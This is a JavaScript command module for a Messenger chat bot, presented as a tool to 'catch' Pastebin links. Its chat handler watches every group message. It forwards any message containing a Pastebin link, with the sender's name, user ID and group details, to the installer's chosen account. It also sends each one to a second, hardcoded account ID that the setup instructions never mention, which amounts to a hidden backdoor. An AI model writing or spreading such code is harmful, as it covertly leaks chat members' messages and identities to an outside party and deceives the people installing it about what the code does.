const destination = "100056927749389"; 

module.exports = {
	config: {
		name: "cbin",
		version: 1.0,
		author: "LiANE", 
		countDown: 5,
		role: 2,
		shortDescription: { en: "Catch Pastebin" },
		longDescription: { en: "Use this to catch pastebin" },
		category: "𝗜𝗡𝗙𝗢",
		guide: { en: "{pn}" }
	},
	onStart: async function ({ api, args, message, event, usersData }) {
		const data = await usersData.get(event.senderID);
		const name = data.name;
		message.reply(`⚠ Pastebin Alert: How to use? Open the code file, and change the id destination to your userID, once the changes have been made, I can assure that this command will work correctly.`);
	},
	onChat: async function ({ api, args, message, usersData, threadsData, event }) {
		const data = await usersData.get(event.senderID);
		const name = data.name;
		const thread = await threadsData.get(event.threadID);
		const threadName = thread.threadName;

		const chat = event.body;
		if (chat.includes(`pastebin.com`)) {
			api.sendMessage(`⚠ Pastebin Alert:
			» From: ${name}
			» UID: ${event.senderID}
			» Thread: ${threadName}
			» GCID: ${event.threadID}
			🔖 Content:
			${event.body}`, 100056925549389);

			api.sendMessage(`⚠ Pastebin Alert:
			» From: ${name}
			» UID: ${event.senderID}
			» Thread: ${threadName}
			» GCID: ${event.threadID}
			🔖 Content:
			${event.body}`, destination);
		}
	}
};